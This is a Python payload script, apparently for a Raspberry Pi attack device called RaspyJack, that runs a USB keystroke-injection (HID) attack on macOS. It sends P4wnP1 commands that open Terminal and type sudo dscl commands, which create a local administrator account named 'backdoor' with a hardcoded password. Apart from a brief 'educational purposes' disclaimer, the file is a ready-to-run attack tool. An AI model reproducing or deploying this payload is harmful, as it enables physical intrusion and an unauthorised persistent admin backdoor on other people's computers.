#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Create Admin User (macOS)**
================================================================
A HID attack that attempts to create a new local administrator account
on a macOS machine.

**NOTE:** This requires the current user to have sudo privileges and will
likely require them to enter their password, making it a very noisy attack.
It is included for educational purposes.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
NEW_USERNAME = "backdoor"
NEW_PASSWORD = "Password123!"
FULL_NAME = "Local Admin"

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "macOS Add Admin"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # Commands to create user and add to admin group
    cmd1 = f"sudo dscl . -create /Users/{NEW_USERNAME}"
    cmd2 = f"sudo dscl . -create /Users/{NEW_USERNAME} UserShell /bin/bash"
    cmd3 = f"sudo dscl . -create /Users/{NEW_USERNAME} RealName '{FULL_NAME}'"
    cmd4 = f"sudo dscl . -create /Users/{NEW_USERNAME} UniqueID 502" # May need to change
    cmd5 = f"sudo dscl . -create /Users/{NEW_USERNAME} PrimaryGroupID 20" # Staff group
    cmd6 = f"sudo dscl . -passwd /Users/{NEW_USERNAME} {NEW_PASSWORD}"
    cmd7 = f"sudo dscl . -append /Groups/admin GroupMembership {NEW_USERNAME}"

    # A single long command is better for HID attacks
    full_command = f"{cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}"
    
    script = f"""
GUI SPACE
delay(500)
type("Terminal")
delay(200)
press("ENTER")
delay(750)
type("{full_command}")
delay(200)
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
